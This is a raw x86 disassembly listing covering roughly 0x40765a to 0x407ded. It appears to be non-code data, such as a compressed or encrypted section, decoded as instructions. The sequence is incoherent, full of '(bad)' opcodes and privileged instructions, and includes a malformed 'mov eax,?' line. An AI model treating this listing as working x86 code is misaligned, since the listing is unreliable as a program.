  40765a:	cmp    eax,DWORD PTR [edi+0x38]
  40765d:	aad    0x4d
  40765f:	push   0xffffff99
  407661:	mov    eax,DWORD PTR [eax]
  407663:	sub    dl,BYTE PTR [ebx]
  407665:	int    0x2e
  407667:	xchg   edi,eax
  407668:	cwde   
  407669:	xchg   ebx,eax
  40766a:	sub    al,0x46
  40766c:	adc    eax,0x60551000
  407671:	fmul   DWORD PTR [esp+esi*8+0x7]
  407675:	dec    ebx
  407676:	or     DWORD PTR [ebx+0x5c],ecx
  407679:	push   edx
  40767a:	push   ebx
  40767b:	ja     0x40760c
  40767d:	cmp    BYTE PTR [edi-0x2f],0xf6
  407681:	mov    esp,0xe1d7cf0f
  407686:	or     al,0x9a
  407688:	cmp    ah,BYTE PTR [esi]
  40768a:	cdq    
  40768b:	popa   
  40768c:	xor    esi,DWORD PTR [edx]
  40768e:	ffreep st(4)
  407690:	or     al,0xa7
  407692:	lods   eax,DWORD PTR ds:[esi]
  407693:	lods   al,BYTE PTR ds:[esi]
  407694:	fdivr  QWORD PTR [eax-0x49]
  407697:	lock (bad) 
  407699:	sbb    eax,0x70a31600
  40769e:	repz mov ebp,0xb1dcf541
  4076a4:	loope  0x40769e
  4076a6:	pop    edi
  4076a7:	jge    0x40765f
  4076a9:	not    DWORD PTR [eax-0x58]
  4076ac:	or     cl,ah
  4076ae:	mov    edi,0xccab732
  4076b3:	dec    edx
  4076b4:	fstp   DWORD PTR [ebp+esi*1-0x234de810]
  4076bb:	push   ecx
  4076bc:	(bad)  
  4076bd:	dec    esi
  4076be:	sub    BYTE PTR [ebx],dl
  4076c0:	xor    BYTE PTR [ecx-0x19],0xa0
  4076c4:	leave  
  4076c5:	gs xchg ecx,eax
  4076c7:	arpl   cx,bx
  4076c9:	xchg   al,bl
  4076cb:	mov    edx,0xe5fe7db1
  4076d0:	xor    DWORD PTR [ecx+0x512d9858],esp
  4076d6:	lds    eax,FWORD PTR [ebp-0x14]
  4076d9:	out    dx,al
  4076da:	jno    0x407708
  4076dc:	(bad)  
  4076dd:	(bad)  
  4076de:	mov    ebp,0xd0171e96
  4076e3:	inc    edx
  4076e4:	cmp    BYTE PTR [eax],dl
  4076e6:	cmp    DWORD PTR [ebx],esp
  4076e8:	adc    al,0x43
  4076ea:	jp     0x40772e
  4076ec:	lahf   
  4076ed:	xor    DWORD PTR [eax+edx*1-0x3a],ebp
  4076f1:	jae    0x407733
  4076f3:	push   0xfffffffd
  4076f5:	mov    dh,BYTE PTR ds:0x14b91a88
  4076fb:	imul   edx,DWORD PTR [ecx+0x3f183cdd],0xf172ace9
  407705:	xor    ecx,DWORD PTR [ebp-0x5]
  407708:	imul   ebp,eax,0x85514bd7
  40770e:	int    0x78
  407710:	rol    DWORD PTR [eax],1
  407712:	inc    ebp
  407713:	adc    dl,BYTE PTR [esi]
  407715:	or     al,0xac
  407717:	sahf   
  407718:	daa    
  407719:	pop    esi
  40771a:	out    dx,eax
  40771b:	ja     0x407741
  40771d:	scas   eax,DWORD PTR es:[edi]
  40771e:	xor    esi,ebx
  407720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407721:	(bad)  
  407722:	popf   
  407723:	out    dx,eax
  407724:	push   es
  407725:	enter  0x21b7,0x2e
  407729:	dec    esp
  40772a:	mov    edi,0xf809018b
  40772f:	push   cs
  407730:	adc    bl,BYTE PTR [edi-0x50335b25]
  407736:	mov    ebp,0xb5dac202
  40773b:	cdq    
  40773c:	xlat   BYTE PTR ds:[ebx]
  40773d:	add    ecx,DWORD PTR [edx+edx*4]
  407740:	mov    bl,0x64
  407742:	cmp    BYTE PTR [edx],bl
  407744:	inc    eax
  407745:	cmc    
  407746:	out    dx,al
  407747:	sahf   
  407748:	push   edx
  407749:	dec    ebx
  40774a:	mov    esi,0xbf67cf86
  40774f:	xchg   esp,eax
  407750:	mov    dl,0x1a
  407752:	leave  
  407753:	xor    ebp,DWORD PTR [ebp-0x32417487]
  407759:	sub    BYTE PTR [ecx-0x10202d64],0xe4
  407760:	jge    0x40775d
  407762:	ins    DWORD PTR es:[edi],dx
  407763:	in     al,dx
  407764:	es into 
  407766:	jno    0x4076f5
  407768:	test   al,0xa7
  40776a:	pop    esi
  40776b:	es in  eax,0x3d
  40776e:	retf   0x3335
  407771:	(bad)  
  407772:	pop    ebp
  407773:	(bad)  
  407774:	iret   
  407775:	dec    eax
  407776:	aas    
  407777:	xor    eax,0x1bdc7d3e
  40777c:	stc    
  40777d:	in     al,0x1b
  40777f:	mov    dh,0xe8
  407781:	push   ebx
  407782:	cli    
  407783:	sub    eax,0x10cf7008
  407788:	pushf  
  407789:	xlat   BYTE PTR ds:[ebx]
  40778a:	lods   eax,DWORD PTR ds:[esi]
  40778b:	inc    esp
  40778c:	(bad)  
  40778d:	sbb    ecx,esi
  40778f:	jmp    DWORD PTR [eax]
  407791:	(bad)  
  407792:	pop    ebx
  407793:	sbb    BYTE PTR [esi-0x2dffe3f0],ah
  407799:	mov    edi,0xd8f01b8c
  40779e:	js     0x4077d9
  4077a0:	inc    edi
  4077a1:	cmp    eax,0xadf21b8a
  4077a6:	pop    esi
  4077a7:	(bad)
  4077aa:	sbb    al,0x2e
  4077ac:	mov    dl,cl
  4077ae:	mov    dh,dh
  4077b0:	mov    al,ds:0xaa33d2c8
  4077b5:	sahf   
  4077b6:	fnstenv [edx+0x78]
  4077b9:	pusha  
  4077ba:	nop
  4077bb:	aad    0x8e
  4077bd:	sbb    esi,edx
  4077bf:	dec    edx
  4077c0:	push   ebp
  4077c1:	jle    0x4077f1
  4077c3:	jmp    0xe6fa:0xe37b43e9
  4077ca:	push   esp
  4077cb:	aad    0xad
  4077cd:	add    al,0xb2
  4077cf:	mov    edi,0xf4bb1b6f
  4077d4:	sub    DWORD PTR [esp+edx*8+0x24],0x77b5a311
  4077dc:	jo     0x407818
  4077de:	jecxz  0x4077b8
  4077e0:	add    esi,DWORD PTR [eax+0x75]
  4077e3:	cdq    
  4077e4:	mov    ah,0x45
  4077e6:	mov    edi,0x5e39cb7d
  4077eb:	gs push esp
  4077ed:	imul   eax,DWORD PTR [eax],0xffffffa3
  4077f0:	cs pop ds
  4077f2:	push   0x9
  4077f4:	in     eax,0x56
  4077f6:	cmp    BYTE PTR [edx],0x9e
  4077f9:	mov    ecx,0x6fa7dee0
  4077fe:	js     0x4077aa
  407800:	push   ebp
  407801:	push   0xffffff9d
  407803:	xor    al,0x39
  407805:	hlt    
  407806:	pop    ecx
  407807:	lds    ebp,FWORD PTR [edx+0x122c3398]
  40780d:	xchg   BYTE PTR [ebx-0x41],bl
  407810:	cmp    eax,DWORD PTR [edx+0x5b]
  407813:	shl    DWORD PTR [ebp-0x4048e6ac],1
  407819:	xor    BYTE PTR [esi+0x60],bl
  40781c:	or     al,0xcf
  40781e:	or     eax,0x52ca65fd
  407823:	xlat   BYTE PTR ds:[ebx]
  407824:	push   esi
  407825:	dec    edx
  407826:	sti    
  407827:	out    dx,al
  407828:	data16 xlat BYTE PTR ds:[ebx]
  40782a:	jno    0x4077fa
  40782c:	or     ah,BYTE PTR [edx-0x7a]
  40782f:	jnp    0x407816
  407831:	or     edi,DWORD PTR [ebx]
  407833:	cmc    
  407834:	pusha  
  407835:	adc    DWORD PTR [ecx-0x41],eax
  407838:	push   esi
  407839:	jge    0x4077f8
  40783b:	cs ins BYTE PTR es:[edi],dx
  40783d:	and    BYTE PTR [eax+0x7146779f],dh
  407843:	stos   BYTE PTR es:[edi],al
  407844:	xor    al,0x35
  407846:	fld    QWORD PTR es:[eax+0x48747d13]
  40784d:	les    eax,FWORD PTR [ecx]
  40784f:	mov    eax,ds:0x334bf207
  407854:	test   edx,esi
  407856:	clc    
  407857:	push   es
  407858:	and    BYTE PTR [edi+0x68],bl
  40785b:	xchg   ebx,eax
  40785c:	shl    DWORD PTR [edx-0x9],0xb8
  407860:	stos   BYTE PTR es:[edi],al
  407861:	call   0x6260526f
  407866:	mov    esi,0xa35bce49
  40786b:	sahf   
  40786c:	sub    bh,BYTE PTR [edx+0x292bca42]
  407872:	ja     0x40784f
  407874:	sar    DWORD PTR [edx+0xe4977b4],cl
  40787a:	push   ecx
  40787b:	pop    ebp
  40787c:	repz push 0xbd3719e6
  407882:	dec    esi
  407883:	jbe    0x4078d3
  407885:	jo     0x40782f
  407887:	jecxz  0x4078ad
  407889:	jl     0x40789a
  40788b:	push   ds
  40788c:	arpl   WORD PTR [edx],di
  40788e:	mov    ebp,gs
  407890:	repz test eax,0x8d9bee63
  407896:	ja     0x40781d
  407898:	sbb    al,0x37
  40789a:	or     DWORD PTR [edx-0x2e],0x3e5eddf0
  4078a1:	cmp    BYTE PTR [ecx],bl
  4078a3:	mov    ds:0x2ec5b57d,al
  4078a8:	cwde   
  4078a9:	push   esi
  4078aa:	and    BYTE PTR [ebx-0x18],dh
  4078ad:	jecxz  0x40789a
  4078af:	les    edi,FWORD PTR [ecx]
  4078b1:	dec    ecx
  4078b2:	loopne 0x40789f
  4078b4:	(bad)  
  4078b5:	xor    bh,al
  4078b7:	inc    ebp
  4078b8:	mov    bh,0x52
  4078ba:	jmp    0x380a6793
  4078bf:	ja     0x40787d
  4078c1:	lock adc dl,BYTE PTR [edx]
  4078c4:	sbb    DWORD PTR [ebx+ecx*8+0x12aaec23],eax
  4078cb:	sub    dh,0x4e
  4078ce:	cmc    
  4078cf:	jecxz  0x40788a
  4078d1:	rol    BYTE PTR [ecx+ecx*1+0x1b],cl
  4078d5:	inc    esp
  4078d6:	jge    0x407870
  4078d8:	retf   
  4078d9:	push   0x2b
  4078db:	shl    BYTE PTR [ecx+ebx*1-0x2dd05d0b],1
  4078e2:	dec    edx
  4078e3:	jne    0x407928
  4078e5:	popf   
  4078e6:	sbb    dh,ah
  4078e8:	sbb    eax,0x11baf886
  4078ed:	dec    eax
  4078ee:	mov    al,0x21
  4078f0:	or     ecx,esp
  4078f2:	jg     0x4078b6
  4078f4:	dec    edi
  4078f5:	add    dh,bh
  4078f7:	push   esi
  4078f8:	aad    0xf9
  4078fa:	stc    
  4078fb:	mov    eax,0xb143282c
  407900:	jg     0x40795f
  407902:	fisubr WORD PTR [edx]
  407904:	pop    edx
  407905:	inc    esi
  407906:	into   
  407907:	mov    ds,WORD PTR [esp+ebx*1-0x360dd752]
  40790e:	test   eax,0x6ce9d501
  407913:	repnz sub eax,0xee3875ed
  407919:	mov    al,ds:0xb18a00e8
  40791e:	dec    edi
  40791f:	mov    al,ds:0x4ba0c9c3
  407924:	imul   esi,DWORD PTR [edi],0x24
  407927:	retf   
  407928:	sbb    DWORD PTR [edx-0x7421015d],esi
  40792e:	cmp    BYTE PTR [eax-0x52d9c712],0x6d
  407935:	inc    eax
  407936:	pop    ebp
  407937:	andps  xmm4,XMMWORD PTR [ebx]
  40793a:	rcl    edi,0x78
  40793d:	xchg   ebp,eax
  40793e:	xchg   esp,eax
  40793f:	or     esp,eax
  407941:	add    BYTE PTR [esi],ch
  407943:	and    BYTE PTR [edi+0x79],bh
  407946:	popa   
  407947:	lock (bad) 
  407949:	mov    ebx,0x6d34bdae
  40794e:	cld    
  40794f:	adc    DWORD PTR [edi+0x37],edi
  407952:	ret    
  407953:	cmp    eax,0x14556ab4
  407958:	stc    
  407959:	ins    BYTE PTR es:[edi],dx
  40795a:	add    eax,0xb18d0b9e
  40795f:	dec    edx
  407960:	xor    dl,BYTE PTR [ecx]
  407962:	push   ebp
  407963:	pop    eax
  407964:	dec    ebx
  407965:	rcr    BYTE PTR [esi+0x1e5c8261],0x73
  40796c:	jne    0x407918
  40796e:	fidiv  WORD PTR [ebp+0x21]
  407971:	fs scas al,BYTE PTR es:[edi]
  407973:	jge    0x4079ee
  407975:	xor    DWORD PTR [eax-0x1c],ecx
  407978:	popf   
  407979:	mov    dl,0xaa
  40797b:	nop
  40797c:	lock mov eax,ds:0xca142ae9
  407982:	jbe    0x4079f2
  407984:	push   0xfffffff6
  407986:	inc    esi
  407987:	push   ebp
  407988:	out    dx,al
  407989:	fiadd  WORD PTR [ecx-0x1f]
  40798c:	std    
  40798d:	push   es
  40798e:	addr16 (bad) 
  407990:	clc    
  407991:	lahf   
  407992:	dec    esp
  407993:	arpl   WORD PTR [edx+0x25],si
  407996:	xor    BYTE PTR [esi+esi*2-0x4e77bbcb],al
  40799d:	std    
  40799e:	mov    ds:0x1d6a0f1d,eax
  4079a3:	push   edx
  4079a4:	push   ds
  4079a5:	xchg   edi,eax
  4079a6:	clc    
  4079a7:	pop    ecx
  4079a8:	int3   
  4079a9:	out    0x1e,eax
  4079ab:	dec    eax
  4079ac:	aam    0x5b
  4079ae:	cld    
  4079af:	lahf   
  4079b0:	ins    BYTE PTR es:[edi],dx
  4079b1:	call   0xe6a9:0x60104eb
  4079b8:	and    eax,DWORD PTR ds:[ebx+eiz*2-0x15]
  4079bd:	lds    ecx,FWORD PTR [edi+ebx*2]
  4079c0:	jmp    0xdd64793e
  4079c5:	inc    eax
  4079c6:	cs in  al,dx
  4079c8:	leave  
  4079c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ca:	cmp    DWORD PTR [eax],edi
  4079cc:	fs bnd jmp 0x407a3e
  4079d0:	sbb    DWORD PTR [ebp+0x3753a935],edx
  4079d6:	or     bh,BYTE PTR [esi+0x3d9eb661]
  4079dc:	imul   esi
  4079de:	push   0xffffffc1
  4079e0:	(bad)  
  4079e1:	sar    ah,0x74
  4079e4:	xchg   ebp,eax
  4079e5:	nop
  4079e6:	call   FWORD PTR [edi]
  4079e8:	bound  esp,QWORD PTR [ebp-0x5dbb3f4b]
  4079ee:	add    ebp,DWORD PTR [ebp-0x453b853a]
  4079f4:	mov    cl,0x2a
  4079f6:	jle    0x4079c3
  4079f8:	dec    edx
  4079f9:	pop    eax
  4079fa:	int3   
  4079fb:	dec    edi
  4079fc:	sahf   
  4079fd:	add    dl,bh
  4079ff:	cwde   
  407a00:	adc    al,0x52
  407a02:	fsub   DWORD PTR ds:0x9ace82ed
  407a08:	jno    0x407a09
  407a0a:	xchg   edx,eax
  407a0b:	pusha  
  407a0c:	cmc    
  407a0d:	fdiv   QWORD PTR [eax+edx*8]
  407a10:	and    DWORD PTR [edx+0x41],esi
  407a13:	not    DWORD PTR [edx+0x341e7cf4]
  407a19:	pop    ss
  407a1a:	cli    
  407a1b:	inc    edi
  407a1c:	(bad)  
  407a1d:	add    BYTE PTR [ecx+eiz*4-0x12807108],0x3
  407a25:	xchg   edi,eax
  407a26:	stos   BYTE PTR es:[edi],al
  407a27:	icebp  
  407a28:	mov    dh,0xf9
  407a2a:	xchg   BYTE PTR [eax+0x37],ch
  407a2d:	xor    ecx,ecx
  407a2f:	xor    al,0xfd
  407a31:	mov    al,0x90
  407a33:	sub    eax,esi
  407a35:	or     esi,DWORD PTR [ebx+ebx*8-0x4b]
  407a39:	pop    ebx
  407a3a:	sub    eax,ebx
  407a3c:	mov    ds:0xda8b2fa9,al
  407a41:	inc    edx
  407a42:	icebp  
  407a43:	sbb    eax,0xfa6e2d23
  407a48:	jne    0x407a91
  407a4a:	dec    esp
  407a4b:	out    0x56,al
  407a4d:	call   0x4768effd
  407a52:	les    esp,FWORD PTR [esi+0x107c809a]
  407a58:	sub    al,0xfc
  407a5a:	jbe    0x407a2d
  407a5c:	or     eax,0xfe42d885
  407a61:	push   esp
  407a62:	inc    edi
  407a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a64:	enter  0x399f,0xb8
  407a68:	inc    ecx
  407a69:	inc    esi
  407a6a:	xchg   esp,eax
  407a6b:	adc    al,0x10
  407a6d:	or     BYTE PTR [esi+0x662af397],bh
  407a73:	ret    0xb86e
  407a76:	push   esp
  407a77:	and    eax,0x2fa3dce6
  407a7c:	push   edi
  407a7d:	fsub   st(2),st
  407a7f:	mov    DWORD PTR [ebx+0xe6d0f64],ecx
  407a85:	jb     0x407a10
  407a87:	test   cl,bl
  407a89:	cs leave 
  407a8b:	in     al,dx
  407a8c:	adc    ah,0x3f
  407a8f:	cmp    eax,DWORD PTR [edx]
  407a91:	sahf   
  407a92:	stc    
  407a93:	jno    0x407a5d
  407a95:	fimul  DWORD PTR [ebx-0x24]
  407a98:	test   al,0x4c
  407a9a:	in     eax,dx
  407a9b:	repz (bad) 
  407a9d:	dec    eax
  407a9e:	pop    ecx
  407a9f:	or     ecx,DWORD PTR [edx]
  407aa1:	cwde   
  407aa2:	fwait
  407aa3:	sub    al,0x9e
  407aa5:	int    0xdf
  407aa7:	push   ebp
  407aa8:	mov    edi,0xcbca67fd
  407aad:	pop    ebx
  407aae:	xchg   DWORD PTR [esi+ebp*8+0x6e1a4381],ecx
  407ab5:	popa   
  407ab6:	call   FWORD PTR [ecx-0x2a70ea24]
  407abc:	in     eax,dx
  407abd:	rcl    BYTE PTR [edx],1
  407abf:	fisub  DWORD PTR [esp+eax*4-0x71]
  407ac3:	int    0x12
  407ac5:	repnz cmp ebp,0x38e16723
  407acc:	retf   0x7f15
  407acf:	fsubr  st(2),st
  407ad1:	push   0xffffff9d
  407ad3:	arpl   WORD PTR [ecx-0xb0d9eda],sp
  407ad9:	lods   al,BYTE PTR ds:[esi]
  407ada:	cli    
  407adb:	les    edx,FWORD PTR [ebx]
  407add:	and    eax,0xf96a0244
  407ae2:	leave  
  407ae3:	icebp  
  407ae4:	xor    eax,0x47b40baa
  407ae9:	ja     0x407ae8
  407aeb:	mov    fs,WORD PTR [edi-0x55]
  407aee:	ins    DWORD PTR es:[edi],dx
  407aef:	xchg   edx,eax
  407af0:	popa   
  407af1:	push   cs
  407af2:	xchg   esp,eax
  407af3:	imul   esi,DWORD PTR [edi+0x58],0x44
  407af7:	fist   WORD PTR [ebp-0x5f20272e]
  407afd:	pusha  
  407afe:	sub    DWORD PTR [eax],edi
  407b00:	stos   DWORD PTR es:[edi],eax
  407b01:	popa   
  407b02:	xchg   esi,eax
  407b03:	aam    0x17
  407b05:	in     al,0x5f
  407b07:	int    0x1c
  407b09:	test   BYTE PTR [eax+0x415dd0ed],bl
  407b0f:	dec    ecx
  407b10:	or     BYTE PTR [eax+0x77],cl
  407b13:	pop    ss
  407b14:	push   ss
  407b15:	or     bl,BYTE PTR [ebp+0x30]
  407b18:	enter  0xe483,0x74
  407b1c:	lods   al,BYTE PTR cs:[esi]
  407b1e:	lahf   
  407b1f:	add    BYTE PTR [esi],0x3d
  407b22:	cmp    DWORD PTR [ebp-0x2e],ecx
  407b25:	cmp    BYTE PTR [ecx],ah
  407b27:	push   es
  407b28:	mov    al,0xb7
  407b2a:	dec    esi
  407b2b:	leave  
  407b2c:	rep lods al,BYTE PTR ds:[esi]
  407b2e:	sti    
  407b2f:	outs   dx,DWORD PTR ds:[esi]
  407b30:	test   DWORD PTR es:[edx+ebp*2-0x5d],ebp
  407b35:	imul   esp,DWORD PTR [eax],0xad5afbd9
  407b3b:	cwde   
  407b3c:	pop    edx
  407b3d:	fimul  WORD PTR [ecx]
  407b3f:	adc    BYTE PTR [eax],bh
  407b41:	int3   
  407b42:	aam    0x81
  407b44:	in     eax,dx
  407b45:	dec    eax
  407b46:	mov    eax,0x8ef371e2
  407b4b:	jno    0x407b96
  407b4d:	aas    
  407b4e:	ins    BYTE PTR es:[edi],dx
  407b4f:	loopne 0x407af4
  407b51:	adc    DWORD PTR [di-0x35ab],0x24
  407b57:	jnp    0x407b9e
  407b59:	fstp   QWORD PTR [eax+0x1233b86]
  407b5f:	dec    edi
  407b60:	bnd jnp 0x407b23
  407b63:	push   eax
  407b64:	test   esi,ebx
  407b66:	enter  0xd722,0xf0
  407b6a:	ss add eax,0x17068eca
  407b70:	enter  0x284e,0x54
  407b74:	lods   eax,DWORD PTR ds:[esi]
  407b75:	mov    ecx,0xc7c801d9
  407b7a:	and    al,0xaa
  407b7c:	or     edx,DWORD PTR [ebx-0x76]
  407b7f:	bound  edx,QWORD PTR [edi+0x44]
  407b82:	sti    
  407b83:	loopne 0x407b1f
  407b85:	cmp    DWORD PTR [edx+0x7436361d],esi
  407b8b:	loopne 0x407b92
  407b8d:	or     eax,0xca17b3ba
  407b92:	lods   eax,DWORD PTR ds:[esi]
  407b93:	dec    ebp
  407b94:	dec    ebx
  407b95:	sbb    ecx,DWORD PTR [edi]
  407b97:	jb     0x407b71
  407b99:	cld    
  407b9a:	pushf  
  407b9b:	rcr    bl,cl
  407b9d:	test   al,0xe1
  407b9f:	sahf   
  407ba0:	std    
  407ba1:	test   BYTE PTR [ecx],dl
  407ba3:	ja     0x407beb
  407ba5:	push   edi
  407ba6:	push   edi
  407ba7:	and    DWORD PTR [edi],esp
  407ba9:	nop
  407baa:	dec    esi
  407bab:	cmp    al,0x6d
  407bad:	into   
  407bae:	outs   dx,DWORD PTR ds:[esi]
  407baf:	sub    eax,0x2daa1e6c
  407bb4:	pop    ss
  407bb5:	and    bh,BYTE PTR [ebp+0x7c]
  407bb8:	sahf   
  407bb9:	bswap  ebp
  407bbb:	(bad)  
  407bbc:	std    
  407bbd:	je     0x407b43
  407bbf:	mov    ds:0x69ef247,eax
  407bc4:	push   0xffffffde
  407bc6:	enter  0x24f2,0x70
  407bca:	add    eax,0x4368b091
  407bcf:	inc    edx
  407bd0:	mov    edi,0x2ad98932
  407bd5:	inc    edx
  407bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bd7:	stos   DWORD PTR es:[edi],eax
  407bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd9:	jmp    0xe463:0x41a8df71
  407be0:	add    eax,0x67e9d3e9
  407be5:	pusha  
  407be6:	xchg   esi,eax
  407be7:	mov    edx,0x1fb7efc2
  407bec:	mov    ds:0xfd5bcdf,eax
  407bf1:	mov    esp,ebx
  407bf3:	and    al,BYTE PTR [edx-0x4e8c21f]
  407bf9:	jmp    0x618a:0x953cd635
  407c00:	popa   
  407c01:	ror    DWORD PTR [esi+0x52f68426],0x7a
  407c08:	test   BYTE PTR [edi-0x1f520c46],dl
  407c0e:	shr    bl,0x97
  407c11:	mov    ecx,esi
  407c13:	inc    eax
  407c14:	aas    
  407c15:	or     dl,BYTE PTR [esi]
  407c17:	nop
  407c18:	and    DWORD PTR [ecx+0x2e],ebp
  407c1b:	les    edx,FWORD PTR [edi+0x1]
  407c1e:	xor    dh,BYTE PTR [ecx-0x21f5ea42]
  407c24:	fwait
  407c25:	jecxz  0x407c37
  407c27:	imul   eax,DWORD PTR ds:[ecx-0x19730a52],0x89c6fb6d
  407c32:	and    DWORD PTR [esi-0x60],eax
  407c35:	lea    eax,ss:[edi-0x5b]
  407c39:	cmpxchg BYTE PTR [edi-0x199504b7],bh
  407c40:	sub    eax,0xd090bd70
  407c45:	repnz daa 
  407c47:	daa    
  407c48:	push   ebp
  407c49:	jge    0x407c15
  407c4b:	(bad)  
  407c4c:	js     0x407c95
  407c4e:	xchg   esi,eax
  407c4f:	add    eax,0x2be905aa
  407c54:	pop    ss
  407c55:	dec    edx
  407c56:	cwde   
  407c57:	push   ebp
  407c58:	mov    al,0xbd
  407c5a:	push   esp
  407c5b:	adc    ebx,ebx
  407c5d:	dec    eax
  407c5e:	adc    eax,0x7221c612
  407c63:	dec    edi
  407c64:	inc    esp
  407c65:	push   esp
  407c66:	pop    ds
  407c67:	pusha  
  407c68:	pop    esi
  407c69:	(bad)  [eax+0x43]
  407c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c6d:	call   0x1696635
  407c72:	or     BYTE PTR [edi+0xd],0xcf
  407c76:	in     al,dx
  407c77:	cmc    
  407c78:	ret    
  407c79:	cld    
  407c7a:	mov    esi,0xfb91b2d6
  407c7f:	sbb    BYTE PTR [eax-0x57],ah
  407c82:	sahf   
  407c83:	and    DWORD PTR [edx],esi
  407c85:	and    DWORD PTR [eax+0x71],esp
  407c88:	scas   al,BYTE PTR es:[edi]
  407c89:	mov    ebp,0xe4773a4d
  407c8e:	inc    eax
  407c8f:	(bad)  
  407c90:	in     al,0x7c
  407c92:	and    eax,0x9268a92b
  407c97:	(bad)  
  407c98:	mov    ds:0xfbd21551,al
  407c9d:	push   esp
  407c9e:	popf   
  407c9f:	icebp  
  407ca0:	scas   al,BYTE PTR es:[edi]
  407ca1:	or     BYTE PTR [ecx-0x18d2e7ef],dl
  407ca7:	push   0xffffffdf
  407ca9:	push   ss
  407caa:	ins    DWORD PTR es:[edi],dx
  407cab:	fucomi st,st(4)
  407cad:	push   esp
  407cae:	sub    BYTE PTR [edx],bh
  407cb0:	mov    ch,0x47
  407cb2:	dec    edi
  407cb3:	imul   ebx,DWORD PTR [ebp-0x18],0x21
  407cb7:	outs   dx,BYTE PTR ds:[esi]
  407cb8:	in     eax,0x8a
  407cba:	arpl   di,bx
  407cbc:	and    dl,ah
  407cbe:	in     eax,0xc0
  407cc0:	ss jp  0x407cba
  407cc3:	adc    al,0x1c
  407cc5:	aas    
  407cc6:	dec    esi
  407cc7:	popf   
  407cc8:	je     0x407ce5
  407cca:	sub    BYTE PTR [ecx],0xb4
  407ccd:	or     BYTE PTR [edx],bh
  407ccf:	fucomp st(1)
  407cd1:	mov    edx,0x41d067d4
  407cd6:	push   es
  407cd7:	fwait
  407cd8:	sahf   
  407cd9:	jb     0x407ca3
  407cdb:	aas    
  407cdc:	or     BYTE PTR [eax-0x56],ch
  407cdf:	icebp  
  407ce0:	or     edi,0x72
  407ce3:	xchg   edx,eax
  407ce4:	mov    dh,0x41
  407ce6:	cmp    al,0x7e
  407ce8:	fisttp WORD PTR [eax]
  407cea:	mov    al,0xcd
  407cec:	jno    0x407d66
  407cee:	aam    0x13
  407cf0:	or     al,0xff
  407cf2:	out    dx,eax
  407cf3:	xor    al,0xcd
  407cf5:	fbstp  TBYTE PTR [edi-0x77]
  407cf8:	int3   
  407cf9:	push   ds
  407cfa:	pop    esp
  407cfb:	cmp    bl,dh
  407cfd:	or     BYTE PTR [edi-0x5a],ah
  407d00:	inc    eax
  407d01:	dec    esi
  407d02:	pop    ebp
  407d03:	sub    al,0x2b
  407d05:	sbb    al,BYTE PTR [edx+eiz*2]
  407d08:	hlt    
  407d09:	dec    eax
  407d0a:	xor    eax,0xcda366c5
  407d0f:	js     0x407d6f
  407d11:	or     DWORD PTR [edi-0x6b4f7182],esi
  407d17:	pop    edx
  407d18:	xchg   ebp,eax
  407d19:	xor    edi,ebp
  407d1b:	add    BYTE PTR [edi+0x36],0x34
  407d1f:	lahf   
  407d20:	cmp    al,0xb1
  407d22:	adc    DWORD PTR [esi+edi*8-0x3b],0x77
  407d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d28:	inc    ecx
  407d29:	repnz test eax,0xfd855dae
  407d2f:	mov    BYTE PTR [ebx-0x48],bl
  407d32:	adc    eax,0xc54ac76c
  407d37:	and    al,0x3c
  407d39:	lods   al,BYTE PTR ds:[esi]
  407d3a:	int3   
  407d3b:	dec    ebx
  407d3c:	sub    edx,edx
  407d3e:	fwait
  407d3f:	inc    BYTE PTR [eax]
  407d41:	jl     0x407d3a
  407d43:	or     edi,DWORD PTR [eax-0x4c5d372e]
  407d49:	daa    
  407d4a:	adc    al,0xad
  407d4c:	les    eax,FWORD PTR [eax]
  407d4e:	shl    DWORD PTR [edx+0x53],cl
  407d51:	xchg   ecx,eax
  407d52:	lods   al,BYTE PTR ds:[esi]
  407d53:	and    BYTE PTR ss:[esi],cl
  407d56:	xor    al,cl
  407d58:	cmp    cl,dh
  407d5a:	sub    al,0x63
  407d5c:	out    dx,al
  407d5d:	mov    ch,0x41
  407d5f:	push   es
  407d60:	rcr    BYTE PTR [edx],1
  407d62:	or     DWORD PTR [ebx-0x25582724],edx
  407d68:	push   edx
  407d69:	inc    edi
  407d6a:	scas   al,BYTE PTR es:[edi]
  407d6b:	push   ss
  407d6c:	lea    esp,[eax]
  407d6e:	sbb    bl,BYTE PTR [eax+0x676b2e21]
  407d74:	pop    esi
  407d75:	or     BYTE PTR [eax-0x4da84a8f],dl
  407d7b:	xor    BYTE PTR [edx+0x77],ch
  407d7e:	and    DWORD PTR [eax+eax*4-0x8],ebx
  407d82:	mov    eax,ebp
  407d84:	inc    edx
  407d85:	jmp    0x54e443dd
  407d8a:	push   eax
  407d8b:	or     ch,BYTE PTR [edi-0x54eac849]
  407d91:	aam    0x7b
  407d93:	adc    ecx,esi
  407d95:	mov    ah,0x73
  407d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d98:	mov    ds:0x7d17c5ba,al
  407d9d:	stos   BYTE PTR es:[edi],al
  407d9e:	das    
  407d9f:	daa    
  407da0:	cmp    eax,0xb292209e
  407da5:	lock push esp
  407da7:	retf   0x3974
  407daa:	outs   dx,BYTE PTR ds:[esi]
  407dab:	pop    ss
  407dac:	jle    0x407dff
  407dae:	xor    bh,BYTE PTR [ecx]
  407db0:	nop
  407db1:	and    al,0x47
  407db3:	pop    ebp
  407db4:	add    DWORD PTR [esi-0x701225e9],0xd7324ba5
  407dbe:	daa    
  407dbf:	jge    0x407e3d
  407dc1:	mov    eax,?
  407dc3:	or     dl,0x89
  407dc6:	outs   dx,DWORD PTR ds:[esi]
  407dc7:	push   edx
  407dc8:	mov    ch,0x7e
  407dca:	(bad)  
  407dcb:	push   0xffffffa1
  407dcd:	push   0xaaa10c78
  407dd2:	mov    ah,0xf9
  407dd4:	mov    BYTE PTR [esi],dh
  407dd6:	push   0x2051b6b5
  407ddb:	mov    bh,0x5e
  407ddd:	mov    eax,ds:0xf7a12fd6
  407de2:	xchg   DWORD PTR [ecx+0x61],esi
  407de5:	and    dh,cl
  407de7:	push   edi
  407de8:	shl    DWORD PTR [ebp-0x15],1
  407deb:	cmp    al,0x4d
  407ded:	xor    BYTE PTR [ebx+edx*2],dh
